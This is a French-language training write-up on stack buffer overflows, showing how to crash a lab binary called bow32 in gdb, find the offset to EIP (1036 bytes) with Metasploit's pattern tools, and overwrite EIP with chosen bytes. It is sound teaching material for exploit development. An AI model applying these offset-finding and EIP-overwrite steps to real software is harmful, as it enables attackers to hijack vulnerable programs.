# Take Control of EIP

{% hint style="warning" %}
Un des aspects les plus importants d'un débordement de tampon basé sur la pile est de prendre le contrôle du pointeur d'instruction (EIP), afin que nous puissions lui indiquer vers quelle adresse il doit sauter. Cela fera pointer l'EIP vers l'adresse où notre shellcode commence et amènera le CPU à l'exécuter.
{% endhint %}

### <mark style="color:red;">Erreur de Segmentation</mark>

#### <mark style="color:green;">Prendre le Contrôle d'EIP</mark>

```bash
student@nix-bow:~$ gdb -q bow32

(gdb) run $(python -c "print '\x55' * 1200")
Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

Si nous insérons 1200 "U" (hex "55") comme entrée, nous pouvons voir à partir des informations du registre que nous avons écrasé l'EIP. Comme nous le savons, l'EIP pointe vers la prochaine instruction à exécuter.

#### <mark style="color:green;">Prendre le Contrôle d'EIP</mark>

```bash
(gdb) info registers 

eax            0x1	1
ecx            0xffffd6c0	-10560
edx            0xffffd06f	-12177
ebx            0x55555555	1431655765
esp            0xffffcfd0	0xffffcfd0
ebp            0x55555555	0x55555555		# <---- EBP écrasé
esi            0xf7fb5000	-134524928
edi            0x0	0
eip            0x55555555	0x55555555		# <---- EIP écrasé
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

***

Cela signifie que nous avons un accès en écriture à l'EIP. Ceci, à son tour, permet de spécifier vers quelle adresse mémoire l'EIP doit sauter. Cependant, pour manipuler le registre, nous avons besoin d'un nombre exact de U jusqu'à l'EIP afin que les 4 octets suivants puissent être écrasés avec notre adresse mémoire désirée.

***

### <mark style="color:red;">Déterminer le Décalage</mark>

Le décalage est utilisé pour déterminer combien d'octets sont nécessaires pour écraser le tampon et combien d'espace nous avons autour de notre shellcode.

{% hint style="warning" %}
Le shellcode est un code de programme qui contient des instructions pour une opération que nous voulons que le CPU exécute. La création manuelle du shellcode sera discutée plus en détail dans d'autres modules. Mais pour économiser du temps d'abord, nous utilisons le Metasploit Framework (MSF) qui offre un script Ruby appelé "pattern\_create" qui peut nous aider à déterminer le nombre exact d'octets pour atteindre l'EIP. Il crée une chaîne unique basée sur la longueur d'octets que vous spécifiez pour aider à déterminer le décalage.
{% endhint %}

#### <mark style="color:green;">Créer un Motif</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot_1@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
mrroboteLiot_1@htb[/htb]$ cat pattern.txt

Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9
```
{% endcode %}

Maintenant nous remplaçons nos 1200 "U" avec les motifs générés et concentrons à nouveau notre attention sur l'EIP.

#### <mark style="color:green;">GDB - Utilisation du Motif Généré</mark>

{% code fullWidth="true" %}
```bash
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()
```
{% endcode %}

#### <mark style="color:green;">GDB - EIP</mark>

```bash
(gdb) info registers eip

eip            0x69423569	0x69423569
```

Nous voyons que l'EIP affiche une adresse mémoire différente, et nous pouvons utiliser un autre outil MSF appelé "pattern\_offset" pour calculer le nombre exact de caractères (décalage) nécessaire pour avancer jusqu'à l'EIP.

#### <mark style="color:green;">GDB - Décalage</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot_1@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569

[*] Exact match at offset 1036
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Si nous utilisons maintenant précisément ce nombre d'octets pour nos "U", nous devrions atterrir exactement sur l'EIP. Pour l'écraser et vérifier si nous l'avons atteint comme prévu, nous pouvons ajouter 4 octets supplémentaires avec "\x66" et l'exécuter pour nous assurer que nous contrôlons l'EIP.

#### <mark style="color:green;">Décalage GDB</mark>

```bash
(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

<figure><img src="../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Maintenant nous voyons que nous avons écrasé l'EIP avec nos caractères "\x66". Ensuite, nous devons découvrir combien d'espace nous avons pour notre shellcode, qui exécutera alors les commandes que nous avons l'intention d'exécuter. Comme nous contrôlons maintenant l'EIP, nous l'écraserons plus tard avec l'adresse pointant vers le début de notre shellcode.
